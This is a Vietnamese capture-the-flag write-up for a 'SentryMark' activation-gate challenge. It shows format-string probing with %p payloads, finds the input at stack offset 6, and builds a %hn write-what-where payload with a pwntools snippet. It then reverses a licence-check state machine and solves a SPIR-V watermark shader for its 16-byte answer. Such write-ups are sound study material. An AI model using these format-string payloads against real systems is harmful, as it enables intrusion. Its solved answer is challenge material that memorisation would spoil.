# Writeup: VinAI Model Registry — SentryMark Activation Gate

## 1. Tổng quan bài toán

**Target:** `nc 172.31.102.101 10003`
**Banner:**
```
VinAI Model Registry v1.0
Loaded 3 models. Stack frame: 0x7ffe7c0f88f8
Model validator ready. Debug mode: ON
Enter diagnostic string: ...
```

Không có file binary được cung cấp trực tiếp; toàn bộ quá trình phân tích dựa trên tương tác qua `nc` để phát hiện lỗ hổng, sau đó tái tạo lại logic của binary qua Ghidra (dump từ memory/patch server) và một file `watermark.spv` (SPIR-V compute shader) được cấp bổ sung.

---

## 2. Giai đoạn 1 — Recon & khai thác Format String

### 2.1. Quan sát ban đầu
- Banner tự in ra `Stack frame: 0x7ffe...` mỗi lần kết nối → gợi ý địa chỉ stack bị leak sẵn, ASLR có thể bypass dễ dàng qua thông tin lộ ra từ chương trình.
- Nhập chuỗi rất dài vào trường **"diagnostic string"** → chương trình **không crash**, chỉ echo lại nguyên văn, và phần dư thừa "tràn" sang cả bước "Enter model name" tiếp theo → cho thấy input được đọc vào buffer lớn dùng chung/liền kề.

### 2.2. Phát hiện Format String Vulnerability
Gửi:
```
Enter diagnostic string: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```
Output:
```
0x7ffe4d9b34a0.(nil).0x7449f00b78c7.0x13.(nil).0x70252e70252e7025...
```
→ Các giá trị hex thực sự được **parse từ vararg stack**, không phải in nguyên văn `%p` → xác nhận **format string bug** ở trường "diagnostic string" (trường "model name" thì an toàn, chỉ echo text thường).

### 2.3. Xác định offset của input trên stack
Gửi marker:
```
AAAA%6$p.%7$p.%8$p
```
Kết quả: `%6$p = 0x252e702541414141` → 4 byte thấp = `41 41 41 41` = "AAAA".

**→ Input của user nằm chính xác tại vị trí tham số thứ 6 (`%6$`)** trên stack khi gọi `printf`. Điều này cho phép kỹ thuật *write-what-where* kinh điển:
```
[8 byte: địa chỉ mục tiêu] + "%6$hn"
```
để ghi giá trị tùy ý vào 1 địa chỉ do attacker chọn.

### 2.4. Leak địa chỉ code/libc để tính base
So sánh `%3$p` giữa nhiều lần kết nối khác nhau:
| Lần | `%3$p` |
|---|---|
| 1 | `0x7449f00b78c7` |
| 2 | `0x7fea608188c7` |

12 bit thấp giống nhau (`...8c7`) → do ASLR chỉ randomize các bit cao (page-aligned), phần offset trong trang giữ nguyên → **xác nhận đây là một con trỏ code/libc thật** (rất có thể trỏ vào trong `__libc_start_main` hoặc hàm gọi `main`), có thể dùng để tính **libc base** nếu biết offset cố định theo version glibc trên server.

> **Lưu ý khai thác:** khi gửi payload chứa byte nhị phân thật (địa chỉ 8-byte) qua `nc`, **không thể gõ tay `\xAA\xBB...`** vì đó chỉ là ký tự ASCII literal, không phải byte thật. Cần dùng `pwntools`:
> ```python
> from pwn import *
> io = remote("172.31.102.101", 10003)
> payload = p64(target_addr) + b"%6$hn"
> io.sendline(payload)
> ```
> Ngoài ra, vì mỗi kết nối mới có ASLR khác nhau, **toàn bộ leak + ghi đè phải nằm trong cùng 1 session** — không được đóng kết nối giữa các bước.

---

## 3. Giai đoạn 2 — Reverse Engineering binary (x86-64, Ghidra)

### 3.1. Entry point / `main()`
```c
undefined8 main(void)
{
    char local_78[16] = {0};   // buffer input, đọc trực tiếp từ mạng

    setvbuf(stdout, NULL, _IOFBF, 0);
    puts("SentryMark activation gate v2");

    while (read(0, local_78, 0x10) == 0x10) {
        // local_78 (16 byte) là INPUT DO NGƯỜI DÙNG KIỂM SOÁT HOÀN TOÀN
        // ... dispatch vào state machine xử lý ...
    }
    puts("SentryMark: activation rejected.");
    return 1;
}
```
Điểm mấu chốt: chương trình đọc **đúng 16 byte mỗi vòng lặp** từ socket — đây là input gốc cho toàn bộ pipeline biến đổi bên dưới.

### 3.2. Cấu trúc: State Machine
Chương trình không chạy tuyến tính mà dùng một **dispatcher dựa trên giá trị `ECX`** (nhảy `JMP LAB_004010ba` sau mỗi khối xử lý) — mỗi khối đọc/ghi trên cùng vùng đệm `RSP+0x20` (16 byte) rồi set `ECX` = state kế tiếp.

Các state/khối đã xác định được:

| Địa chỉ | Blob dùng | Phép biến đổi |
|---|---|---|
| `LAB_00401240` | `MARK_TRLO_BLOB[16..31]` | `data[i] = (blob[i] + data[i]) & 0xFF` (cộng byte, tương đương XOR+2·AND) |
| `LAB_00401288` | `MARK_PERM1_BLOB[16..31]` | Hoán vị: `dst[perm1[i]] = src[i]` |
| `LAB_004012c0` | `MARK_PERMO_BLOB[16..31]` | Hoán vị: `dst[perm0[i]] = src[i]`, ghi ra cả `RSP+0x20` và `RSP+0x40` |
| `LAB_00401300` | `MARK_ROTOR_BLOB[16..31]` | `raw[i] = (input[i] ^ 0xA5) + blob[i]`, encode hex → in ra `licence-token` |
| `LAB_00401210` | `MARK_MUL1_BLOB[16]` | Nhân (`MUL`) |
| `LAB_004011a0` | `MARK_KEY0_BLOB[16]` | Kết hợp AND/ADD/SUB |
| `LAB_00401168` | `MARK_TRL1_BLOB[16]` | AND/XOR (giống TRLO) |
| `LAB_004011e0` | `MARK_TGT_BLOB[16]` | **So sánh** (không biến đổi) — kiểm tra 16 byte khớp hằng số mục tiêu, sai thì nhảy tới nhánh reject `LAB_004010e7` |

### 3.3. Dữ liệu các blob đã dump được

```
MARK_TGT_BLOB[16..31]   (dùng để so khớp / target):
e2 55 97 fc ef e0 0e e5 de 61 13 23 8c 35 55 fa

MARK_PERM1_BLOB[16..31] (bảng hoán vị giai đoạn 1):
01 03 0d 09 0f 0c 05 04 08 0e 06 02 0a 0b 07 00

MARK_TRLO_BLOB[16..31]:
f5 ea ef 79 47 fb a4 f7 45 36 b7 69 37 5c 1d ea
```
*(`MARK_ROTOR_BLOB`, `MARK_PERMO_BLOB`, `MARK_MUL1_BLOB`, `MARK_KEY0_BLOB`, `MARK_TRL1_BLOB` — cần dump thêm để hoàn thiện toàn bộ đồ thị trạng thái; xem mục 5 "Việc còn dang dở".)*

### 3.4. Kết luận giai đoạn 2
- Pipeline mã hoá licence-token gồm ít nhất **4 bước biến đổi tuần tự** (cộng byte theo `TRLO` → hoán vị theo `PERM1` → hoán vị theo `PERMO` → XOR+cộng theo `ROTOR` → mã hex) áp dụng lên 16-byte input do người dùng gửi.
- Có một nhánh **kiểm tra riêng biệt** (`MARK_TGT_BLOB`) không phải một phần của pipeline mã hoá, mà là **điều kiện gate**: nếu 16 byte tại một thời điểm nào đó trong state machine không khớp target, request bị reject ngay (không tạo được token).
- Thứ tự thực thi đầy đủ của các state (bảng dispatch/switch-table tại `main`) **chưa được xác nhận hoàn toàn** — cần dump thêm đoạn code chứa switch-table gốc để suy ra trình tự chính xác state 0 → ... → state cuối.

---

## 4. Giai đoạn 3 — GPU Watermark Verifier (`watermark.spv`)

File được cấp bổ sung là 1 **SPIR-V compute shader** (`local_size = 16x1x1`), dùng `spirv-tools` (`spirv-dis`) để disassemble.

### 4.1. Logic tái tạo (GLSL-like)
```glsl
layout(local_size_x = 16) in;

const uint KEY_A[16] = {158,160,39,36,112,162,178,232,226,42,71,86,217,250,186,29};
const uint KEY_B[16] = {181,30,66,154,60,46,65,83,36,154,173,107,169,151,48,132};

layout(binding=0) readonly  buffer Input  { uint data[16]; } INPUT;
layout(binding=1) writeonly buffer Output { uint data[17]; } OUTPUT;
shared uint tmp[16];

uint mix(uint a, uint b) {
    uint v = b;
    v = ((v + a) * 977317915u) & 0xFFu;
    v = ((v ^ (v >> 6)) * 2897629957u) & 0xFFu;
    v = ((v + a * 243u) ^ 182u) & 0xFFu;
    return v;
}

void main() {
    uint id = gl_LocalInvocationID.x;               // 0..15
    uint expected = KEY_B[id] ^ mix(id, KEY_A[id]);
    uint x = (INPUT.data[id] ^ expected) & 0xFFu;    // 0 nếu byte đúng

    tmp[id] = x;
    barrier();

    if (id == 0) {
        uint orAll = 0u;
        for (int i = 0; i < 16; i++) orAll |= tmp[i];
        OUTPUT.data[16] = (orAll == 0u) ? 1u : 0u;   // 1 = toàn bộ 16 byte khớp
    }
    OUTPUT.data[id] = 0u;
}
```

### 4.2. Giải phương trình ngược
Vì `x = 0 ⇔ INPUT[i] == expected[i]`, để watermark hợp lệ, input phải bằng:
```
expected[i] = KEY_B[i] XOR mix(i, KEY_A[i])
```

Tính bằng Python:
```python
KEY_A = [158,160,39,36,112,162,178,232,226,42,71,86,217,250,186,29]
KEY_B = [181,30,66,154,60,46,65,83,36,154,173,107,169,151,48,132]

def mix(a, b):
    v = b
    v = ((v + a) * 977317915) & 0xFF
    v = ((v ^ (v >> 6)) * 2897629957) & 0xFF
    v = ((v + a*243) ^ 182) & 0xFF
    return v

correct = [ (KEY_B[i] ^ mix(i, KEY_A[i])) & 0xFF for i in range(16) ]
print(bytes(correct))
```

**Kết quả:**
```
Hex   : 4b6374467242484b6647304538334449
ASCII : KctFrBHKfG0E83DI
```

Đây là chuỗi 16 byte làm cho shader trả về `OUTPUT[16] = 1` (watermark hợp lệ).

---

## 5. Việc còn dang dở / bước tiếp theo

1. **Chưa xác nhận input `KctFrBHKfG0E83DI` có phải chính là 16-byte mà `main()` (binary x86) đọc từ `read(0, local_78, 0x10)` hay không** — cần thử gửi trực tiếp chuỗi này vào server qua `nc`/`pwntools` và quan sát phản hồi (có in ra `licence-token` hợp lệ / thông báo accept không).
2. **Chưa dump đầy đủ**: `MARK_ROTOR_BLOB[0..15]` phần đầu (đã có, dùng làm salt/tag), `MARK_PERMO_BLOB`, `MARK_MUL1_BLOB`, `MARK_KEY0_BLOB`, `MARK_TRL1_BLOB` — cần cho việc dựng lại chính xác toàn bộ pipeline nếu muốn *forge* token cho input tuỳ ý thay vì chỉ chuỗi cố định từ watermark.
3. **Chưa xác nhận thứ tự chạy thật của state machine** (switch/jump table gốc tại `main`, khu vực `LAB_004010b5`/`LAB_004010ba`/`LAB_004010bc`) — nếu cần forge token cho dữ liệu khác `KctFrBHKfG0E83DI`, phải biết chính xác trình tự và điều kiện chuyển state.
4. Khả năng khai thác **format string → ghi đè (`%hn`)** vẫn còn bỏ ngỏ vì chưa xác định được địa chỉ mục tiêu cụ thể (biến cờ debug/validate hoặc con trỏ hàm) để ghi đè — cần tiếp tục leak libc base bằng offset cố định theo version glibc.

---

## 6. Tổng kết nhanh (TL;DR)

- **Lỗ hổng phát hiện:** Format string tại trường "diagnostic string", input nằm ở vararg offset `%6$`.
- **Cơ chế xác thực chính (`SentryMark`):** state machine biến đổi 16-byte input qua nhiều bước XOR/cộng/hoán vị dùng các bảng hằng số cố định trong binary, có 1 bước so khớp bắt buộc với `MARK_TGT_BLOB`.
- **Bí mật GPU (`watermark.spv`):** một compute shader kiểm tra độc lập 16-byte "watermark", đã giải ngược ra được chuỗi hợp lệ: **`KctFrBHKfG0E83DI`**.
- **Bước tiếp theo:** thử `KctFrBHKfG0E83DI` trực tiếp trên server, đối chiếu với luồng SentryMark x86 để xác nhận đây có phải là mảnh ghép cuối cùng dẫn tới flag hay không.
